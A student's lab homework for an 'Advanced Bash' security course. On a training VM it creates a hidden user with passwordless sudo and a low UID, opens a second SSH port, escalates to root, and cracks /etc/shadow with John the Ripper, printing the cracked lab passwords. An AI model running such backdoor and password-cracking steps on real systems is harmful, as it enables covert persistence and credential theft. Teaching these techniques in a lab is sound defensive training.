## Week 6 Homework Submission File: Advanced Bash - Owning the System



**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
    - `sudo adduser --no-create-home sysd`

2. Give your secret user a password: 
    - `sudo passwd sysd`

3. Give your secret user a system UID < 1000:
    - `sudo usermod -u 200 sysd`

4. Give your secret user the same GID:
   - `sudo groupmod -g 200 sysd`

5. Give your secret user full `sudo` access without the need for a password:
   -  `sudo visudo`
   -  Add the line: `sysd ALL=(ALL:ALL) NOPASSWD:ALL` under the `root` entry
   
6. Test that `sudo` access works without your password:

    - `su sysd`
    - `sudo -l`
    
    ```bash
    Matching Defaults entries for sysd on scavenger-hunt:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User sysd may run the following commands on scavenger-hunt:
        (ALL : ALL) NOPASSWD: ALL
    
    ```

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

    - `sudo nano /etc/ssh/sshd_config`
    
    ```bash
    Port 22
    Port 2222
    ```

**Step 3: Testing Your Configuration Update**

1. Restart the SSH service:
    - `service ssh restart`
    - `enter password for sysadmin`
    
2. Exit the `root` account:
    - `exit`

3. SSH to the target machine using your `sysd` account and port `2222`:
    - ``ssh sysd@192.168.6.105 -p 2222``

4. Use `sudo` to switch to the root user:
    - `sudo su`

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

    - ```ssh sysd@192.168.6.105 -p 2222```
2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:
    - `sudo su`
    - `john /etc/shadow`


    ```bash
    Created directory: /root/.john
    Loaded 8 password hashes with 8 different salts (crypt, generic crypt(3) [?/64])
    Press 'q' or Ctrl-C to abort, almost any other key for status
    sysd             (sysd)
    computer         (stallman)
    freedom          (babbage)
    trustno1         (mitnik)
    dragon           (lovelace)
    lakers           (turing)
    passw0rd         (sysadmin)
    Goodluck!        (student)
    8g 0:00:03:10 100% 2/3 0.04190g/s 576.2p/s 590.8c/s 590.8C/s Missy!..Jupiter!
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed
    ```



